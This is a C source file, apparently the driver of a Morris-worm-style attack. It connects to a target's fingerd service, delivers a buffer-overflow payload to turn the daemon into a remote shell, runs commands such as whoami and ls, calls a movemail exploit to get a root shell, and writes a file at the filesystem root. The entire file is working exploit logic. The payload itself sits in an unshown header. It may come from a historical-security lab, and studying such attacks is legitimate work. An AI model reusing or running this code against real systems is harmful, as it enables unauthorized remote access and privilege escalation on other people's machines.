#include "worm.h"

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;
	char io_buf[IO_BUF_SIZE];
    char buf[BUF_SIZE];

	sock = socket(AF_INET, SOCK_STREAM, 0);
	create_sockaddr(&serv_addr, TARGET_IP, FINGERD_PORT);

	// connect to fingerd
	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        exit(1);
    }

	// deliever payload; fingerd should now be a shell
	create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);
	write(sock, buf, (size_t)sizeof(buf));
    printf("Payload delivered!\n");
	sleep(1);

	char *echo_command = "echo connected123\n";
	char *export_path = "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n";
	char *whoami = "whoami\n";
	char *ls = "ls -al\n";
	char *touch_file = "cd /; echo Hello from ubuntu! > hello_from_ubuntu; cat hello_from_ubuntu\n";
	
	// the first command probably gets ignored
	write_to_sock(sock, echo_command);

	read_from_sock(sock, io_buf, (size_t)IO_BUF_SIZE);
	write_to_sock(sock, export_path);

	write_to_sock(sock, whoami);
	read_from_sock(sock, io_buf, (size_t)IO_BUF_SIZE);

	get_root_shell_via_movemail_exploit(sock, io_buf, (size_t)IO_BUF_SIZE);

	// the first command gets ignored by the new shell 
	write_to_sock(sock, whoami);
	read_from_sock(sock, io_buf, (size_t)IO_BUF_SIZE);

	write_to_sock(sock, whoami);
	read_from_sock(sock, io_buf, (size_t)IO_BUF_SIZE);

	write_to_sock(sock, touch_file);
	read_from_sock(sock, io_buf, (size_t)IO_BUF_SIZE);

	close(sock);

    return 0;
}
